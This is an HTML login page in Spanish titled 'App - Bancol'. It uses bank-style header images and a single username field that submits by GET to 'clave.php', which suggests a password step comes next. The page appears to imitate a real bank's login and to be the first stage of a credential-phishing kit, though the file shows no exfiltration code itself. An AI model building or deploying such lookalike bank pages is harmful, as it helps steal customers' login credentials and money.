<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/styles.css">
  <link rel="icon" type="image/png" href="img/logo.png">
  <link 
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+Knujsl5+5hb5g9Aa6eZwkn3Fl4iIeZx9XfkZHB1Ojq9FQ9" crossorigin="anonymous">
  <title>App - Bancol</title>
</head>
<body>
  <header>
    <img src="img/bc3.png" alt="" class="cabecera">
  </header>
  <div>
    <img src="img/letras.png" alt="" class="letras">
  </div>
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-12 col-sm-8 col-md-6 col-lg-4">
        <div class="form-container">
          <form action="clave.php" method="GET" id="userForm">
            <div class="mb-2">
              <div class="inputb">
                <img src="img/user.png" alt="" class="user">
                <input 
                  type="text" 
                  id="username" 
                  name="username" 
                  class="form-control"
                  placeholder="Escribe tu usuario" 
                  required>
              </div>
            </div>
            <button type="submit" class="btn disabled">CONTINUAR</button>
          </form>
        </div>
      </div>
    </div>
  </div>
  <img src="img/lineas-pawg.png" alt="" class="lineas">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-7MQFJDkUIW6EJFPDReD58BEPrHYk3snCwv5J1qYBGOe/9JZ3xP/J53Xf/Ivdzx8C" crossorigin="anonymous"></script>
  <script src="js/form-handler.js"></script>
</body>
</html>